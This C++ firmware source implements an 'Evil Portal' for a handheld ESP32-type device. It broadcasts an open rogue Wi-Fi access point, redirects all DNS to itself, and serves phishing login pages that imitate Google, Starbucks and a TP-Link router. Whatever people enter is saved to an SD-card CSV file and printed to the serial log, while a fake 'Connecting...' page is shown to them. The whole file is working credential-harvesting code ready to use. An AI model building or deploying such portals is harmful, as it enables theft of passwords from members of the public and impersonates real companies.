// ===================================================================
// bySaw Evil Portal
//
// Open rogue AP with DNS catch-all and credential-harvesting captive
// portal. SELECT on the selection screen picks a template (4 built-in
// + up to 8 SD files from /evil_portal/*.html). AP SSID auto-matches
// the chosen theme. SELECT during runtime exits.
// ===================================================================
#include "config.h"
#include "shared.h"
#include "EvilPortal.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SD.h>

extern TFT_eSPI tft;
extern bool feature_active;
extern bool feature_exit_requested;
bool featureExitButtonPressed();
bool isButtonPressed(int);
bool isButtonPressedEdge(int);
#ifndef BTN_UP
#define BTN_UP    6
#define BTN_DOWN  3
#define BTN_SELECT 7
#endif

namespace EvilPortal {

// ---------------------------------------------------------------
// Built-in templates (PROGMEM)
// ---------------------------------------------------------------

static const char kHtmlGeneric[] PROGMEM =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,"
    "initial-scale=1'><title>WiFi Login</title><style>*{box-sizing:border-box}"
    "body{font-family:Arial,sans-serif;background:#f2f2f2;margin:0}"
    ".c{max-width:340px;margin:48px auto;background:#fff;padding:28px;"
    "border-radius:10px;box-shadow:0 2px 8px rgba(0,0,0,.15)}"
    "h2{text-align:center;color:#333}"
    "input{width:100%;padding:11px;margin:7px 0;border:1px solid #ccc;"
    "border-radius:6px}button{width:100%;padding:12px;background:#1a73e8;"
    "color:#fff;border:0;border-radius:6px;font-size:16px;margin-top:8px}"
    "p{color:#888;font-size:12px;text-align:center}"
    "</style></head><body><div class='c'><h2>Sign in to WiFi</h2>"
    "<form method='POST' action='/login'>"
    "<input name='username' placeholder='Email or username' autocomplete='username'>"
    "<input name='password' type='password' placeholder='Password' autocomplete='current-password'>"
    "<button type='submit'>Connect</button></form>"
    "<p>Accept terms to access the internet</p></div></body></html>";

static const char kHtmlGoogle[] PROGMEM =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,"
    "initial-scale=1'><title>Sign in \xe2\x80\x93 Google Accounts</title>"
    "<style>*{box-sizing:border-box}body{font-family:Roboto,Arial,sans-serif;"
    "background:#fff;margin:0}#c{max-width:450px;margin:64px auto;padding:48px 40px;"
    "border:1px solid #dadce0;border-radius:8px}h1{text-align:center;font-size:24px;"
    "font-weight:400;color:#202124;margin:0 0 8px}p{text-align:center;color:#202124;"
    "margin:0 0 28px;font-size:16px}input{width:100%;border:1px solid #dadce0;"
    "border-radius:4px;padding:13px 15px;font-size:16px;margin-bottom:24px;outline:0}"
    "input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}"
    ".btn{background:#1a73e8;color:#fff;border:0;border-radius:4px;width:100%;"
    "padding:10px;font-size:14px;font-weight:500}.foot{font-size:12px;color:#5f6368;"
    "text-align:center;margin-top:16px}</style></head><body><div id='c'>"
    "<h1>Sign in</h1><p>Use your Google Account</p>"
    "<form method='POST' action='/login'>"
    "<input name='email' type='email' placeholder='Email or phone' autocomplete='username'>"
    "<input name='password' type='password' placeholder='Password' autocomplete='current-password'>"
    "<button class='btn'>Next</button></form>"
    "<div class='foot'>By signing in you agree to our Terms of Service</div>"
    "</div></body></html>";

static const char kHtmlStarbucks[] PROGMEM =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,"
    "initial-scale=1'><title>Starbucks Wi-Fi</title>"
    "<style>*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#1e3932;font-family:Arial,Helvetica,sans-serif;"
    "min-height:100vh;display:flex;align-items:center;justify-content:center}"
    ".card{background:#fff;border-radius:12px;padding:40px 36px;max-width:380px;width:90%}"
    "h2{text-align:center;color:#1e3932;font-size:22px;margin-bottom:6px}"
    "p{text-align:center;color:#666;font-size:13px;margin-bottom:24px}"
    "input{width:100%;border:1px solid #ccc;border-radius:6px;padding:12px;"
    "font-size:15px;margin-bottom:16px}"
    "button{width:100%;background:#00a862;color:#fff;border:0;border-radius:50px;"
    "padding:14px;font-size:16px;font-weight:700}"
    "small{display:block;text-align:center;color:#999;font-size:11px;margin-top:14px}"
    "</style></head><body><div class='card'>"
    "<h2>&#9749; Starbucks Wi-Fi</h2>"
    "<p>Connect to enjoy free Wi-Fi at this location</p>"
    "<form method='POST' action='/login'>"
    "<input name='email' type='email' placeholder='Email address'>"
    "<input name='password' type='password' placeholder='Password'>"
    "<button type='submit'>Connect</button></form>"
    "<small>By connecting you agree to the Terms of Use</small>"
    "</div></body></html>";

static const char kHtmlRouter[] PROGMEM =
    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,"
    "initial-scale=1'><title>TP-Link - Router Login</title>"
    "<style>*{box-sizing:border-box}body{background:#f5f5f5;font-family:Arial;"
    "margin:0}header{background:#c40000;padding:0 20px;height:60px;display:flex;"
    "align-items:center;color:#fff;font-size:22px;font-weight:700}"
    "header span{font-size:12px;margin-left:8px;font-weight:400;opacity:.8}"
    ".wrap{max-width:380px;margin:60px auto;background:#fff;border:1px solid #ddd;"
    "border-radius:4px;overflow:hidden}.hd{background:#c40000;padding:16px 24px;"
    "color:#fff;font-size:18px}.bd{padding:32px 24px}"
    "label{display:block;font-size:14px;color:#555;margin-bottom:6px}"
    "input{width:100%;border:1px solid #ccc;border-radius:3px;padding:9px 12px;"
    "font-size:14px;margin-bottom:20px}"
    "button{width:100%;background:#c40000;color:#fff;border:0;padding:11px;"
    "font-size:15px;border-radius:3px}"
    "p{font-size:12px;color:#999;text-align:center;margin-top:12px}"
    "</style></head><body>"
    "<header>TP-Link <span>Wireless Router</span></header>"
    "<div class='wrap'><div class='hd'>Router Login</div><div class='bd'>"
    "<form method='POST' action='/login'>"
    "<label>Username</label>"
    "<input name='username' value='admin' autocomplete='username'>"
    "<label>Password</label>"
    "<input name='password' type='password' placeholder='Password' autocomplete='current-password'>"
    "<button type='submit'>Log In</button></form>"
    "<p>Default: admin / admin</p></div></div></body></html>";

// ---------------------------------------------------------------
// Portal registry
// ---------------------------------------------------------------

struct Portal {
    const char *name;    // display name (≤14 chars)
    const char *apSsid;  // AP SSID to broadcast
    const char *html;    // PROGMEM ptr, nullptr = SD file
    char sdPath[48];     // path for SD portals
};

static const int MAX_PORTALS = 12;
static Portal s_portals[MAX_PORTALS];
static int s_portalCount = 0;

static void buildPortalList() {
    s_portalCount = 0;

    // built-ins always first
    s_portals[s_portalCount++] = {"Generic WiFi",  "Free WiFi",       kHtmlGeneric,   {}};
    s_portals[s_portalCount++] = {"Google Acct",   "Google_WiFi",     kHtmlGoogle,    {}};
    s_portals[s_portalCount++] = {"Starbucks",     "Starbucks",       kHtmlStarbucks, {}};
    s_portals[s_portalCount++] = {"TP-Link Admin", "TP-Link_2G",      kHtmlRouter,    {}};

    // scan SD /evil_portal/*.html
    if (SD.cardType() == CARD_NONE) return;
    SD.mkdir("/evil_portal");
    File dir = SD.open("/evil_portal");
    if (!dir) return;
    while (s_portalCount < MAX_PORTALS) {
        File f = dir.openNextFile();
        if (!f) break;
        const char *fn = f.name();
        int len = strlen(fn);
        if (len >= 5 && strcasecmp(fn + len - 5, ".html") == 0) {
            Portal &p = s_portals[s_portalCount++];
            // derive display name from filename (strip .html, max 14 chars)
            strncpy(p.sdPath, "/evil_portal/", sizeof(p.sdPath) - 1);
            strncat(p.sdPath, fn, sizeof(p.sdPath) - 14 - 1);
            p.sdPath[sizeof(p.sdPath) - 1] = 0;
            // display name = filename without extension
            static char nm[15];
            strncpy(nm, fn, 14);
            nm[14] = 0;
            char *dot = strrchr(nm, '.');
            if (dot) *dot = 0;
            p.name   = nm;
            p.apSsid = "Free WiFi";
            p.html   = nullptr;
        }
        f.close();
    }
    dir.close();
}

// ---------------------------------------------------------------
// Runtime state
// ---------------------------------------------------------------

static const byte DNS_PORT = 53;
static DNSServer  s_dns;
static WebServer  s_web(80);
static File       s_csv;
static bool       s_csvOpen   = false;
static String     s_template;
static String     s_apIp;
static int        s_captured  = 0;
static int        s_hits      = 0;
static volatile bool s_dirty   = true;
static const char *s_portalName = "";
static const char *s_activeApSsid = "";

// ---------------------------------------------------------------
// Template loader
// ---------------------------------------------------------------

static void loadTemplate(int idx) {
    s_template = "";
    if (idx < 0 || idx >= s_portalCount) return;
    const Portal &p = s_portals[idx];
    if (p.html) {
        // PROGMEM — copy to RAM string
        const char *src = p.html;
        s_template.reserve(strlen_P(src) + 1);
        char c;
        while ((c = pgm_read_byte(src++))) s_template += c;
        Serial.printf("[evil] built-in template: %s (%d bytes)\n", p.name, s_template.length());
    } else {
        // SD file
        File f = SD.open(p.sdPath, FILE_READ);
        if (f) {
            size_t sz = f.size();
            if (sz > 24576) sz = 24576;
            s_template.reserve(sz + 1);
            while (f.available() && s_template.length() < sz) s_template += (char)f.read();
            f.close();
            Serial.printf("[evil] SD template: %s (%d bytes)\n", p.sdPath, s_template.length());
        }
    }
}

// ---------------------------------------------------------------
// Web handlers
// ---------------------------------------------------------------

static void handleRoot() {
    s_hits++;
    s_dirty = true;
    s_web.send(200, "text/html", s_template);
}

static void handleRedirect() {
    s_web.sendHeader("Location", "http://" + s_apIp + "/", true);
    s_web.send(302, "text/plain", "");
}

static void handleLogin() {
    String rec = "";
    for (int i = 0; i < s_web.args(); i++) {
        if (i) rec += " | ";
        rec += s_web.argName(i) + "=" + s_web.arg(i);
    }
    Serial.printf("[evil] CAPTURED: %s\n", rec.c_str());
    if (s_csvOpen) {
        s_csv.printf("%lu,%s\n", (unsigned long)(millis() / 1000), rec.c_str());
        s_csv.flush();
    }
    s_captured++;
    s_dirty = true;
    s_web.send(200, "text/html",
        "<html><head><meta http-equiv='refresh' content='4;url=/'></head>"
        "<body style='font-family:Arial;text-align:center;margin-top:60px'>"
        "<h3>Connecting...</h3><p>Please wait while we verify your access.</p>"
        "</body></html>");
}

// ---------------------------------------------------------------
// Display: running portal status
// ---------------------------------------------------------------

static void drawRunning() {
    tft.fillScreen(UI_BG);
    tft.setTextFont(1);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);

    tft.setTextSize(1);
    int y = 44;
    tft.setTextColor(UI_TEXT, UI_BG);
    tft.setCursor(10, y); tft.printf("AP:   %s", s_activeApSsid); y += 16;
    tft.setCursor(10, y); tft.print("IP:   "); tft.print(s_apIp.c_str()); y += 16;
    tft.setCursor(10, y); tft.printf("Tmpl: %s", s_portalName); y += 22;

    tft.setTextColor(UI_OK, UI_BG);
    tft.setTextSize(2);
    tft.setCursor(10, y); tft.printf("Clients: %d", WiFi.softAPgetStationNum()); y += 26;
    tft.setCursor(10, y); tft.printf("Views:   %d", s_hits); y += 26;
    tft.setTextColor(UI_WARN, UI_BG);
    tft.setCursor(10, y); tft.printf("Creds:   %d", s_captured);

    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("SEL: exit", tft.width() / 2, tft.height() - 12, 1);
}

// ---------------------------------------------------------------
// Display: template selection screen
// ---------------------------------------------------------------

static void drawSelect(int sel) {
    tft.fillScreen(UI_BG);
    tft.setTextFont(1);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 6, 1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("Choose template", tft.width() / 2, 26, 1);

    const int rowH = 28;
    const int top  = 42;
    const int visRows = (tft.height() - top - 18) / rowH;  // ~9
    int start = 0;
    if (sel >= visRows) start = sel - visRows + 1;

    for (int i = start; i < s_portalCount && (i - start) < visRows; i++) {
        int y   = top + (i - start) * rowH;
        bool hi = (i == sel);
        tft.fillRect(0, y, tft.width(), rowH - 2,  hi ? UI_ACCENT : UI_BG);
        tft.setTextColor(hi ? UI_BG : UI_TEXT, hi ? UI_ACCENT : UI_BG);
        tft.setTextSize(1);
        tft.setCursor(10, y + 6);
        tft.print(s_portals[i].name);
        tft.setTextColor(hi ? UI_BG : UI_DIM_TEXT, hi ? UI_ACCENT : UI_BG);
        tft.setCursor(10, y + 16);
        tft.print(s_portals[i].apSsid);
    }

    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.drawCentreString("UP/DN: choose  SEL: launch", tft.width() / 2, tft.height() - 10, 1);
}

// ---------------------------------------------------------------
// run()
// ---------------------------------------------------------------

void run() {
    feature_exit_requested = false;
    // feature_active = false here so featureExitButtonPressed() doesn't
    // consume SELECT on the selection screen
    feature_active = false;

    pauseBackgroundRadioTasks();
    buildPortalList();

    // --- selection screen ---
    int sel = 0;
    drawSelect(sel);
    bool launched = false;
    while (!feature_exit_requested) {
        if (isButtonPressedEdge(BTN_UP)) {
            if (sel > 0) { sel--; drawSelect(sel); }
            while (isButtonPressed(BTN_UP)) delay(10);
        }
        if (isButtonPressedEdge(BTN_DOWN)) {
            if (sel < s_portalCount - 1) { sel++; drawSelect(sel); }
            while (isButtonPressed(BTN_DOWN)) delay(10);
        }
        if (isButtonPressedEdge(BTN_SELECT)) {
            while (isButtonPressed(BTN_SELECT)) delay(10);
            launched = true;
            break;
        }
        delay(20);
    }

    if (!launched || feature_exit_requested) {
        Serial.println("[evil] cancelled at selection");
        return;
    }

    // --- launch portal ---
    feature_active = true;
    s_captured = 0;
    s_hits     = 0;
    s_dirty    = true;
    s_portalName    = s_portals[sel].name;
    s_activeApSsid  = s_portals[sel].apSsid;
    const char *apSsid = s_activeApSsid;

    tft.fillScreen(UI_BG);
    tft.setTextColor(UI_ICON, UI_BG);
    tft.setTextSize(2);
    tft.drawCentreString("Evil Portal", tft.width() / 2, 8, 1);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, UI_BG);
    tft.setCursor(10, 40);
    tft.printf("Loading: %s", s_portalName);

    loadTemplate(sel);

    // open CSV log
    if (SD.cardType() != CARD_NONE) {
        SD.mkdir("/evil_portal");
        char path[52];
        snprintf(path, sizeof(path), "/evil_portal/creds-%lu.csv", (unsigned long)(millis() / 1000));
        s_csv = SD.open(path, FILE_WRITE);
        if (s_csv) { s_csvOpen = true; s_csv.print("uptime_s,fields\n"); Serial.printf("[evil] log %s\n", path); }
    }

    WiFi.mode(WIFI_AP);
    WiFi.softAP(apSsid);
    delay(200);
    IPAddress ip = WiFi.softAPIP();
    s_apIp = ip.toString();
    s_dns.start(DNS_PORT, "*", ip);

    s_web.on("/", handleRoot);
    s_web.on("/login", HTTP_POST, handleLogin);
    s_web.on("/login", HTTP_GET,  handleRoot);
    s_web.on("/generate_204",        handleRedirect);
    s_web.on("/gen_204",             handleRedirect);
    s_web.on("/hotspot-detect.html", handleRoot);
    s_web.on("/ncsi.txt",            handleRedirect);
    s_web.on("/connecttest.txt",     handleRedirect);
    s_web.onNotFound(handleRoot);
    s_web.begin();
    Serial.printf("[evil] AP '%s' up at %s (template: %s)\n", apSsid, ip.toString().c_str(), s_portalName);

    drawRunning();

    uint32_t lastDraw  = millis();
    int      lastClients = -1;
    while (!feature_exit_requested && !featureExitButtonPressed()) {
        s_dns.processNextRequest();
        s_web.handleClient();
        int clients = WiFi.softAPgetStationNum();
        if (s_dirty || clients != lastClients || millis() - lastDraw > 1000) {
            drawRunning();
            s_dirty      = false;
            lastClients  = clients;
            lastDraw     = millis();
        }
        delay(2);
    }

    s_web.stop();
    s_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    if (s_csvOpen) { s_csv.flush(); s_csv.close(); s_csvOpen = false; }
    Serial.printf("[evil] stopped: %d creds, %d views, template=%s\n", s_captured, s_hits, s_portalName);
}

}  // namespace EvilPortal
